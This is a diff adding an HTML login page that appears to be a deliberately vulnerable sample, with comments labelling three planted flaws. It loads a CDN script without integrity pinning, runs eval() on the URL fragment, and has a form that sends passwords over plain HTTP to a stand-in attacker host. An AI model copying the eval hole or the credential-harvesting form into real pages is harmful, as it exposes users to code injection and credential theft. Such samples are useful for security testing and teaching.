@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Secure Portal Login</title>
+  <!-- 1. MISSING Subresource Integrity (SRI) on external CDN -->
+  <script src="https://cdn.untrusted-thirdparty.net/unpinned.js"></script>
+  <!-- 2. MALICIOUS inline script: dangerous eval() -->
+  <script>
+    var hash = location.hash.slice(1);
+    eval(hash); 
+    document.write('Session expired');
+  </script>
+</head>
+<body>
+  <h2>Customer Sign In</h2>
+  <!-- 3. PHISHING EXFILTRATION: Sends passwords over plain HTTP to external server -->
+  <form action="http://attacker-c2.example.com/harvest" method="POST">
+    <label>Username: <input type="text" name="user"></label><br>
+    <label>Password: <input type="password" name="pass"></label><br>
+    <button type="submit">Log In</button>
+  </form>
+</body>
+</html>
